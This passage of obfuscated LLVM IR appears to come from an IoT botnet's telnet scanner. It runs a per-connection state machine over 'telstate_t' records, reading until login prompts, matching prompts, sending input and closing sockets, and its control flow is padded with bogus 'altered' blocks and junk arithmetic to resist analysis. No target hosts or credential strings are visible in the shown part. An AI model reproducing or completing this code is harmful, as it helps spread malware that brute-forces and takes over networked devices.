  %3065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3064
  %3066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3065, i32 0, i32 2
  store i8 0, i8* %3066, align 8
  %3067 = load i32, i32* %2, align 4
  %3068 = sext i32 %3067 to i64
  %3069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3068
  %3070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3069, i32 0, i32 3
  store i8 1, i8* %3070, align 1
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %556
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %597
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %672
  %3071 = load i32, i32* %2, align 4
  %3072 = sext i32 %3071 to i64
  %3073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3072
  %3074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3073, i32 0, i32 8
  %3075 = load i8*, i8** %3074, align 8
  call void @llvm.memset.p0i8.i64(i8* %3075, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %729
  %3076 = load i32, i32* %2, align 4
  %3077 = sext i32 %3076 to i64
  %3078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3077
  %3079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3078, i32 0, i32 2
  store i8 5, i8* %3079, align 8
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %750
  %3080 = load i32, i32* %2, align 4
  %3081 = sext i32 %3080 to i64
  %3082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3081
  %3083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3082, i32 0, i32 2
  store i8 3, i8* %3083, align 8
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %781
  %3084 = load i32, i32* %2, align 4
  %3085 = sext i32 %3084 to i64
  %3086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3085
  %3087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3086, i32 0, i32 0
  %3088 = load i32, i32* %3087, align 16
  %3089 = load i32, i32* %2, align 4
  %3090 = sext i32 %3089 to i64
  %3091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3090
  %3092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3091, i32 0, i32 8
  %3093 = load i8*, i8** %3092, align 8
  %3094 = load i32, i32* %2, align 4
  %3095 = sext i32 %3094 to i64
  %3096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3095
  %3097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3096, i32 0, i32 7
  %3098 = load i16, i16* %3097, align 16
  %3099 = zext i16 %3098 to i32
  %3100 = call i32 @readUntil(i32 %3088, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3093, i32 1024, i32 %3099)
  %3101 = icmp ne i32 %3100, 0
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %816
  %3102 = load i32, i32* %2, align 4
  %3103 = sext i32 %3102 to i64
  %3104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3103
  %3105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3104, i32 0, i32 6
  store i32 0, i32* %3105, align 4
  %3106 = load i32, i32* %2, align 4
  %3107 = sext i32 %3106 to i64
  %3108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3107
  %3109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3108, i32 0, i32 7
  store i16 0, i16* %3109, align 16
  %3110 = load i32, i32* %2, align 4
  %3111 = sext i32 %3110 to i64
  %3112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3111
  %3113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3112, i32 0, i32 8
  %3114 = load i8*, i8** %3113, align 8
  call void @llvm.memset.p0i8.i64(i8* %3114, i8 0, i64 1024, i32 1, i1 false)
  %3115 = load i32, i32* %2, align 4
  %3116 = sext i32 %3115 to i64
  %3117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3116
  %3118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3117, i32 0, i32 2
  store i8 5, i8* %3118, align 8
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %885
  %3119 = load i32, i32* %2, align 4
  %3120 = sext i32 %3119 to i64
  %3121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3120
  %3122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3121, i32 0, i32 2
  store i8 5, i8* %3122, align 8
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %940
  %3123 = load i32, i32* %2, align 4
  %3124 = sext i32 %3123 to i64
  %3125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3124
  %3126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3125, i32 0, i32 6
  store i32 0, i32* %3126, align 4
  %3127 = load i32, i32* %2, align 4
  %3128 = sext i32 %3127 to i64
  %3129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3128
  %3130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3129, i32 0, i32 7
  store i16 0, i16* %3130, align 16
  %3131 = load i32, i32* %2, align 4
  %3132 = sext i32 %3131 to i64
  %3133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3132
  %3134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3133, i32 0, i32 8
  %3135 = load i8*, i8** %3134, align 8
  call void @llvm.memset.p0i8.i64(i8* %3135, i8 0, i64 1024, i32 1, i1 false)
  %3136 = load i32, i32* %2, align 4
  %3137 = sext i32 %3136 to i64
  %3138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3137
  %3139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3138, i32 0, i32 2
  store i8 5, i8* %3139, align 8
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %987
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %1056
  %3140 = load i32, i32* %2, align 4
  %3141 = sext i32 %3140 to i64
  %3142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3141
  %3143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3142, i32 0, i32 0
  %3144 = load i32, i32* %3143, align 16
  %3145 = call i32 @sclose(i32 %3144)
  %3146 = load i32, i32* %2, align 4
  %3147 = sext i32 %3146 to i64
  %3148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3147
  %3149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3148, i32 0, i32 2
  store i8 0, i8* %3149, align 8
  %3150 = load i32, i32* %2, align 4
  %3151 = sext i32 %3150 to i64
  %3152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3151
  %3153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3152, i32 0, i32 3
  store i8 1, i8* %3153, align 1
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %1087
  %3154 = load i32, i32* %2, align 4
  %3155 = sext i32 %3154 to i64
  %3156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3155
  %3157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3156, i32 0, i32 0
  %3158 = load i32, i32* %3157, align 16
  %3159 = call i64 @send(i32 %3158, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %3160 = icmp slt i64 %3159, 0
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %1144
  %3161 = load i32, i32* %2, align 4
  %3162 = sext i32 %3161 to i64
  %3163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3162
  %3164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3163, i32 0, i32 0
  %3165 = load i32, i32* %3164, align 16
  %3166 = load i32, i32* %2, align 4
  %3167 = sext i32 %3166 to i64
  %3168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3167
  %3169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3168, i32 0, i32 8
  %3170 = load i8*, i8** %3169, align 8
  %3171 = load i32, i32* %2, align 4
  %3172 = sext i32 %3171 to i64
  %3173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3172
  %3174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3173, i32 0, i32 7
  %3175 = load i16, i16* %3174, align 16
  %3176 = zext i16 %3175 to i32
  %3177 = call i32 @readUntil(i32 %3165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3170, i32 1024, i32 %3176)
  %3178 = icmp ne i32 %3177, 0
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %1179
  %3179 = load i32, i32* %2, align 4
  %3180 = sext i32 %3179 to i64
  %3181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3180
  %3182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3181, i32 0, i32 6
  store i32 0, i32* %3182, align 4
  %3183 = load i32, i32* %2, align 4
  %3184 = sext i32 %3183 to i64
  %3185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3184
  %3186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3185, i32 0, i32 7
  store i16 0, i16* %3186, align 16
  %3187 = load i32, i32* %2, align 4
  %3188 = sext i32 %3187 to i64
  %3189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3188
  %3190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3189, i32 0, i32 8
  %3191 = load i8*, i8** %3190, align 8
  %3192 = call i8* @strstr(i8* %3191, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %3193 = icmp ne i8* %3192, null
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %1211
  %3194 = load i32, i32* %2, align 4
  %3195 = sext i32 %3194 to i64
  %3196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3195
  %3197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3196, i32 0, i32 2
  store i8 5, i8* %3197, align 8
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %1232
  %3198 = load i32, i32* %2, align 4
  %3199 = sext i32 %3198 to i64
  %3200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3199
  %3201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3200, i32 0, i32 2
  store i8 7, i8* %3201, align 8
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %1259
  %3202 = load i32, i32* %2, align 4
  %3203 = sext i32 %3202 to i64
  %3204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3203
  %3205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3204, i32 0, i32 0
  %3206 = load i32, i32* %3205, align 16
  %3207 = load i32, i32* %2, align 4
  %3208 = sext i32 %3207 to i64
  %3209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3208
  %3210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3209, i32 0, i32 8
  %3211 = load i8*, i8** %3210, align 8
  %3212 = load i32, i32* %2, align 4
  %3213 = sext i32 %3212 to i64
  %3214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3213
  %3215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3214, i32 0, i32 7
  %3216 = load i16, i16* %3215, align 16
  %3217 = zext i16 %3216 to i32
  %3218 = call i32 @readUntil(i32 %3206, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3211, i32 1024, i32 %3217)
  %3219 = icmp ne i32 %3218, 0
  br label %originalBB127

originalBB131alteredBB:                           ; preds = %originalBB131, %1315
  %3220 = load i32, i32* %2, align 4
  %3221 = sext i32 %3220 to i64
  %3222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3221
  %3223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3222, i32 0, i32 2
  store i8 7, i8* %3223, align 8
  br label %originalBB131

originalBB135alteredBB:                           ; preds = %originalBB135, %1388
  %3224 = load i32, i32* %2, align 4
  %3225 = sext i32 %3224 to i64
  %3226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3225
  %3227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3226, i32 0, i32 8
  %3228 = load i8*, i8** %3227, align 8
  %3229 = call i8* @strstr(i8* %3228, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %3230 = icmp ne i8* %3229, null
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %1412
  %3231 = load i32, i32* %2, align 4
  %3232 = sext i32 %3231 to i64
  %3233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3232
  %3234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3233, i32 0, i32 0
  %3235 = load i32, i32* %3234, align 16
  %3236 = call i32 @sclose(i32 %3235)
  %3237 = load i32, i32* %2, align 4
  %3238 = sext i32 %3237 to i64
  %3239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3238
  %3240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3239, i32 0, i32 2
  store i8 0, i8* %3240, align 8
  %3241 = load i32, i32* %2, align 4
  %3242 = sext i32 %3241 to i64
  %3243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3242
  %3244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3243, i32 0, i32 3
  store i8 0, i8* %3244, align 1
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %1443
  %3245 = load i32, i32* %2, align 4
  %3246 = sext i32 %3245 to i64
  %3247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3246
  %3248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3247, i32 0, i32 8
  %3249 = load i8*, i8** %3248, align 8
  %3250 = call i8* @strstr(i8* %3249, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %3251 = icmp ne i8* %3250, null
  br label %originalBB143

originalBB147alteredBB:                           ; preds = %originalBB147, %1513
  %3252 = load i32, i32* %2, align 4
  %3253 = sext i32 %3252 to i64
  %3254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3253
  %3255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3254, i32 0, i32 0
  %3256 = load i32, i32* %3255, align 16
  %3257 = call i32 @sclose(i32 %3256)
  %3258 = load i32, i32* %2, align 4
  %3259 = sext i32 %3258 to i64
  %3260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3259
  %3261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3260, i32 0, i32 2
  store i8 0, i8* %3261, align 8
  %3262 = load i32, i32* %2, align 4
  %3263 = sext i32 %3262 to i64
  %3264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3263
  %3265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3264, i32 0, i32 3
  store i8 0, i8* %3265, align 1
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %1575
  %3266 = load i32, i32* %2, align 4
  %3267 = sext i32 %3266 to i64
  %3268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3267
  %3269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3268, i32 0, i32 0
  %3270 = load i32, i32* %3269, align 16
  %3271 = call i32 @sclose(i32 %3270)
  %3272 = load i32, i32* %2, align 4
  %3273 = sext i32 %3272 to i64
  %3274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3273
  %3275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3274, i32 0, i32 2
  store i8 0, i8* %3275, align 8
  %3276 = load i32, i32* %2, align 4
  %3277 = sext i32 %3276 to i64
  %3278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3277
  %3279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3278, i32 0, i32 3
  store i8 0, i8* %3279, align 1
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %1610
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %1627
  br label %originalBB159

originalBB163alteredBB:                           ; preds = %originalBB163, %1645
  %3280 = load i32, i32* %2, align 4
  %3281 = sext i32 %3280 to i64
  %3282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3281
  %3283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3282, i32 0, i32 8
  %3284 = load i8*, i8** %3283, align 8
  %3285 = call i64 @strlen(i8* %3284) #10
  %3286 = trunc i64 %3285 to i16
  %3287 = load i32, i32* %2, align 4
  %3288 = sext i32 %3287 to i64
  %3289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3288
  %3290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3289, i32 0, i32 7
  store i16 %3286, i16* %3290, align 16
  br label %originalBB163

originalBB167alteredBB:                           ; preds = %originalBB167, %1673
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %1690
  %3291 = load i32, i32* %2, align 4
  %3292 = sext i32 %3291 to i64
  %3293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3292
  %3294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3293, i32 0, i32 6
  %3295 = load i32, i32* %3294, align 4
  %_172 = sub i32 %3295, 10
  %gen173 = mul i32 %_172, 10
  %_174 = sub i32 0, %3295
  %gen175 = add i32 %_174, 10
  %_176 = sub i32 %3295, 10
  %gen177 = mul i32 %_176, 10
  %_178 = sub i32 %3295, 10
  %gen179 = mul i32 %_178, 10
  %_180 = shl i32 %3295, 10
  %3296 = add i32 %3295, 10
  %3297 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %3298 = icmp ult i32 %3296, %3297
  br label %originalBB171

originalBB184alteredBB:                           ; preds = %originalBB184, %1730
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1822
  %3299 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %3300 = load i32, i32* %2, align 4
  %3301 = sext i32 %3300 to i64
  %3302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3301
  %3303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3302, i32 0, i32 6
  store i32 %3299, i32* %3303, align 4
  br label %originalBB188

originalBB192alteredBB:                           ; preds = %originalBB192, %1907
  %3304 = load i32, i32* %2, align 4
  %3305 = sext i32 %3304 to i64
  %3306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3305
  %3307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3306, i32 0, i32 8
  %3308 = load i8*, i8** %3307, align 8
  call void @llvm.memset.p0i8.i64(i8* %3308, i8 0, i64 1024, i32 1, i1 false)
  %3309 = load i32, i32* %2, align 4
  %3310 = sext i32 %3309 to i64
  %3311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3310
  %3312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3311, i32 0, i32 0
  %3313 = load i32, i32* %3312, align 16
  %3314 = call i32 @sclose(i32 %3313)
  %3315 = load i32, i32* %2, align 4
  %3316 = sext i32 %3315 to i64
  %3317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3316
  %3318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3317, i32 0, i32 2
  store i8 0, i8* %3318, align 8
  %3319 = load i32, i32* %2, align 4
  %3320 = sext i32 %3319 to i64
  %3321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3320
  %3322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3321, i32 0, i32 3
  store i8 1, i8* %3322, align 1
  br label %originalBB192

originalBB196alteredBB:                           ; preds = %originalBB196, %2009
  %3323 = load i32, i32* %2, align 4
  %3324 = sext i32 %3323 to i64
  %3325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3324
  %3326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3325, i32 0, i32 8
  %3327 = load i8*, i8** %3326, align 8
  %3328 = call i32 @matchPrompt(i8* %3327)
  %3329 = icmp ne i32 %3328, 0
  br label %originalBB196

originalBB200alteredBB:                           ; preds = %originalBB200, %2033
  %3330 = load i32, i32* %2, align 4
  %3331 = sext i32 %3330 to i64
  %3332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3331
  %3333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3332, i32 0, i32 8
  %3334 = load i8*, i8** %3333, align 8
  call void @llvm.memset.p0i8.i64(i8* %3334, i8 0, i64 1024, i32 1, i1 false)
  %3335 = load i32, i32* %2, align 4
  %3336 = sext i32 %3335 to i64
  %3337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3336
  %3338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3337, i32 0, i32 0
  %3339 = load i32, i32* %3338, align 16
  %3340 = call i32 @sclose(i32 %3339)
  %3341 = load i32, i32* %2, align 4
  %3342 = sext i32 %3341 to i64
  %3343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3342
  %3344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3343, i32 0, i32 2
  store i8 0, i8* %3344, align 8
  %3345 = load i32, i32* %2, align 4
  %3346 = sext i32 %3345 to i64
  %3347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3346
  %3348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3347, i32 0, i32 3
  store i8 1, i8* %3348, align 1
  br label %originalBB200

originalBB204alteredBB:                           ; preds = %originalBB204, %2069
  %3349 = load i32, i32* %2, align 4
  %3350 = sext i32 %3349 to i64
  %3351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3350
  %3352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3351, i32 0, i32 2
  store i8 7, i8* %3352, align 8
  br label %originalBB204

originalBB208alteredBB:                           ; preds = %originalBB208, %2090
  %3353 = load i32, i32* %2, align 4
  %3354 = sext i32 %3353 to i64
  %3355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3354
  %3356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3355, i32 0, i32 8
  %3357 = load i8*, i8** %3356, align 8
  call void @llvm.memset.p0i8.i64(i8* %3357, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB208

originalBB212alteredBB:                           ; preds = %originalBB212, %2363
  %3358 = load i32, i32* %2, align 4
  %3359 = sext i32 %3358 to i64
  %3360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3359
  %3361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3360, i32 0, i32 8
  %3362 = load i8*, i8** %3361, align 8
  call void @llvm.memset.p0i8.i64(i8* %3362, i8 0, i64 1024, i32 1, i1 false)
  %3363 = load i32, i32* %2, align 4
  %3364 = sext i32 %3363 to i64
  %3365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3364
  %3366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3365, i32 0, i32 0
  %3367 = load i32, i32* %3366, align 16
  %3368 = call i32 @sclose(i32 %3367)
  %3369 = load i32, i32* %2, align 4
  %3370 = sext i32 %3369 to i64
  %3371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3370
  %3372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3371, i32 0, i32 2
  store i8 0, i8* %3372, align 8
  %3373 = load i32, i32* %2, align 4
  %3374 = sext i32 %3373 to i64
  %3375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3374
  %3376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3375, i32 0, i32 3
  store i8 1, i8* %3376, align 1
  br label %originalBB212

originalBB216alteredBB:                           ; preds = %originalBB216, %2473
  %3377 = load i32, i32* %2, align 4
  %3378 = sext i32 %3377 to i64
  %3379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3378
  %3380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3379, i32 0, i32 8
  %3381 = load i8*, i8** %3380, align 8
  call void @llvm.memset.p0i8.i64(i8* %3381, i8 0, i64 1024, i32 1, i1 false)
  %3382 = load i32, i32* %2, align 4
  %3383 = sext i32 %3382 to i64
  %3384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3383
  %3385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3384, i32 0, i32 0
  %3386 = load i32, i32* %3385, align 16
  %3387 = call i32 @sclose(i32 %3386)
  %3388 = load i32, i32* %2, align 4
  %3389 = sext i32 %3388 to i64
  %3390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3389
  %3391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3390, i32 0, i32 2
  store i8 0, i8* %3391, align 8
  %3392 = load i32, i32* %2, align 4
  %3393 = sext i32 %3392 to i64
  %3394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3393
  %3395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3394, i32 0, i32 3
  store i8 1, i8* %3395, align 1
  br label %originalBB216

originalBB220alteredBB:                           ; preds = %originalBB220, %2520
  %3396 = load i32, i32* %2, align 4
  %3397 = sext i32 %3396 to i64
  %3398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3397
  %3399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3398, i32 0, i32 0
  %3400 = load i32, i32* %3399, align 16
  %3401 = load i32, i32* %2, align 4
  %3402 = sext i32 %3401 to i64
  %3403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3402
  %3404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3403, i32 0, i32 8
  %3405 = load i8*, i8** %3404, align 8
  %3406 = load i32, i32* %2, align 4
  %3407 = sext i32 %3406 to i64
  %3408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3407
  %3409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3408, i32 0, i32 7
  %3410 = load i16, i16* %3409, align 16
  %3411 = zext i16 %3410 to i32
  %3412 = call i32 @readUntil(i32 %3400, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3405, i32 1024, i32 %3411)
  %3413 = icmp ne i32 %3412, 0
  br label %originalBB220

originalBB224alteredBB:                           ; preds = %originalBB224, %2649
  %3414 = load i32, i32* %2, align 4
  %3415 = sext i32 %3414 to i64
  %3416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3415
  %3417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3416, i32 0, i32 6
  store i32 0, i32* %3417, align 4
  %3418 = load i32, i32* %2, align 4
  %3419 = sext i32 %3418 to i64
  %3420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3419
  %3421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3420, i32 0, i32 7
  store i16 0, i16* %3421, align 16
  %3422 = load i32, i32* %2, align 4
  %3423 = sext i32 %3422 to i64
  %3424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3423
  %3425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3424, i32 0, i32 8
  %3426 = load i8*, i8** %3425, align 8
  %3427 = call i8* @strstr(i8* %3426, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %3428 = icmp ne i8* %3427, null
  br label %originalBB224

originalBB228alteredBB:                           ; preds = %originalBB228, %2755
  br label %originalBB228

originalBB232alteredBB:                           ; preds = %originalBB232, %2784
  %3429 = load i32, i32* %2, align 4
  %3430 = sext i32 %3429 to i64
  %3431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3430
  %3432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3431, i32 0, i32 0
  %3433 = load i32, i32* %3432, align 16
  %3434 = call i32 @sclose(i32 %3433)
  %3435 = load i32, i32* %2, align 4
  %3436 = sext i32 %3435 to i64
  %3437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3436
